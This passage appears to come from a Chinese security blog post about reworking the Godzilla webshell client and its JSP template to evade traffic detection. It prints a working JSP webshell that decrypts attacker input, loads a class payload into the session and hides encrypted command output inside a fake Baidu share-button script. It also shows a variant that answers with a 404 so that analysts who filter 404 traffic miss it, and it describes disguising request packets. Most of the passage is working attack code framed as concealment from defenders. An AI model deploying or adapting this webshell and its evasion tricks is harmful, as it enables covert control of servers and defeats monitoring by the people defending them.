        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">decodeCipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">functions</span><span class="o">.</span><span class="na">base64Decode</span><span class="o">(</span><span class="n">findStr</span><span class="o">(</span><span class="n">data</span><span class="o">)));</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>这里开始解码了，关键是 findStr 对我们的数据进行了处理</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">String</span> <span class="nf">findStr</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">respResult</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">//从标识里面提出真正的结果</span>
    <span class="k">return</span> <span class="n">functions</span><span class="o">.</span><span class="na">subMiddleStr</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">respResult</span><span class="o">),</span> <span class="k">this</span><span class="o">.</span><span class="na">findStrLeft</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">findStrRight</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>就是只截取中间的字符串，也就是 base64 编码的部分</p>
<p>所以我们需要修改的话还需要修改后端的逻辑</p>
<p>这里各位师傅都各显神通了，伪造了 waf 页面是一个不错的选择</p>
<p>这里可以参考开源工具<br/>
<a href="https://github.com/kong030813/Z-Godzilla_ekp" target="_blank">https://github.com/kong030813/Z-Godzilla_ekp</a></p>
<div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">findStrMd5</span> <span class="o">=</span> <span class="n">functions</span><span class="o">.</span><span class="na">md5</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pass</span> <span class="o">+</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">key</span><span class="o">));</span>
<span class="n">String</span> <span class="n">md5Prefix</span> <span class="o">=</span> <span class="n">findStrMd5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">5</span><span class="o">);</span>
<span class="k">this</span><span class="o">.</span><span class="na">findStrLeft1</span> <span class="o">=</span> <span class="s">"var Rebdsek_config="</span><span class="o">;</span>
<span class="k">this</span><span class="o">.</span><span class="na">findStrLeft</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">findStrLeft1</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"bdsek"</span><span class="o">,</span> <span class="n">md5Prefix</span><span class="o">);</span>
<span class="k">this</span><span class="o">.</span><span class="na">findStrRight</span> <span class="o">=</span> <span class="s">";"</span><span class="o">;</span>
</pre></div>
<p>可以看到把原来的修改为了固定头加替换，半固定吧<br/>
然后我们看效果</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222115-b0d97d34-b0b8-1.png"/></p>
<p>可以看到原作回显已经变了</p>
<p>当然模板也需要修改了</p>
<p>我们看看二开的模板</p>
<div class="highlight"><pre><span></span><span class="o">&lt;%</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// 获取并解码传入的 base64 参数</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="n">base64Decode</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">pass</span><span class="o">).</span><span class="na">getBytes</span><span class="o">());</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">base64Decode</span><span class="o">(</span><span class="n">data</span><span class="o">);</span> <span class="c1">// 再次解码</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span> <span class="c1">// 使用 AES 解密</span>

        <span class="c1">// 如果 session 中没有 payload，则加载字节码</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">,</span> <span class="k">new</span> <span class="n">X</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">()).</span><span class="na">Q</span><span class="o">(</span><span class="n">data</span><span class="o">));</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="c1">// 如果 payload 存在，则继续处理</span>
            <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"parameters"</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>

            <span class="c1">// 创建 ByteArrayOutputStream 用于存储数据</span>
            <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ByteArrayOutputStream</span> <span class="n">arrOut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ByteArrayOutputStream</span><span class="o">();</span>

            <span class="c1">// 通过反射实例化 payload</span>
            <span class="n">Object</span> <span class="n">f</span> <span class="o">=</span> <span class="o">((</span><span class="n">Class</span><span class="o">)</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"payload"</span><span class="o">)).</span><span class="na">newInstance</span><span class="o">();</span>

            <span class="c1">// 执行一些无意义的操作（这里只是防止错误的代码）</span>
            <span class="n">f</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">arrOut</span><span class="o">);</span>
            <span class="n">f</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">pageContext</span><span class="o">);</span>

            <span class="c1">// 获取 MD5 的前 5 个字符</span>
            <span class="n">String</span> <span class="n">left</span> <span class="o">=</span> <span class="n">md5</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">5</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">();</span>

            <span class="c1">// 替换字符串中的部分内容</span>
            <span class="n">String</span> <span class="n">replacedString</span> <span class="o">=</span> <span class="s">"var Rebdsek_config="</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">"bdsek"</span><span class="o">,</span> <span class="n">left</span><span class="o">);</span>

            <span class="c1">// 设置响应的内容类型为 HTML</span>
            <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/html"</span><span class="o">);</span>

            <span class="c1">// 输出 HTML 页面的头部和开始部分</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;!DOCTYPE html&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;html lang=\"en\"&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;head&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;meta charset=\"UTF-8\"&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;title&gt;{title}&lt;/title&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;/head&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;body&gt;"</span><span class="o">);</span>

            <span class="c1">// 输出嵌入的 JavaScript 代码</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;script&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;!-- Baidu Button BEGIN"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;script type=\"text/javascript\" id=\"bdshare_js\" data=\"type=slide&amp;amp;img=8&amp;amp;pos=right&amp;amp;uid=6537022\" &gt;&lt;/script&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;script type=\"text/javascript\" id=\"bdshell_js\"&gt;&lt;/script&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;script type=\"text/javascript\"&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">replacedString</span><span class="o">);</span> <span class="c1">// 输出替换后的 JavaScript 代码</span>
            <span class="n">f</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span> <span class="c1">// 执行某些操作</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">base64Encode</span><span class="o">(</span><span class="n">x</span><span class="o">(</span><span class="n">arrOut</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="kc">true</span><span class="o">)));</span> <span class="c1">// 输出加密数据</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">";"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"document.getElementById(\"bdshell_js\").src = \"http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=\" + Math.ceil(new Date()/3600000);"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;/script&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"--&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;/script&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;/body&gt;"</span><span class="o">);</span>
            <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;/html&gt;"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 捕获异常并忽略</span>
    <span class="o">}</span>
<span class="o">%&gt;</span>
</pre></div>
<p>我感觉不如伪造一个 404 页面来得实在</p>
<p>只需要在木马中多加</p>
<div class="highlight"><pre><span></span><span class="o">&lt;%</span>
    <span class="n">response</span><span class="o">.</span><span class="na">setStatus</span><span class="o">(</span><span class="mi">404</span><span class="o">);</span>  <span class="c1">// 设置 HTTP 状态码为 404</span>
    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">"Page not found"</span><span class="o">);</span>
<span class="o">%&gt;</span>
</pre></div>
<p>我们看看效果<br/>
访问这个木马</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222124-b5bd6d56-b0b8-1.png"/></p>
<p>然后看看执行命令的回显</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222127-b7a02690-b0b8-1.png"/></p>
<p>可以看到直接是 404</p>
<p>这样还是比较容易隐蔽的，一般我看流量都会过滤 404 的包</p>
<h3 data-content="1" id="222e9016db8c67f1de0a3b5dfe35f692">请求包特征</h3>
<p>我们随便看一个请求包都是</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222131-b9ffbe50-b0b8-1.png"/></p>
<p>参数=编码</p>
<p>所以这里我们还可以伪造一下请求包</p>
<p>我们可以直接在基础中修改</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222135-bcb04f5c-b0b8-1.png"/></p>
<p>然后我们再次看到请求包</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241202222141-c007039e-b0b8-1.png"/></p>
<p>可以看到已经变了</p>
<p>参考<a href="https://github.com/kong030813/Z-Godzilla_ekp" target="_blank">https://github.com/kong030813/Z-Godzilla_ekp</a></p>
</div>
</div>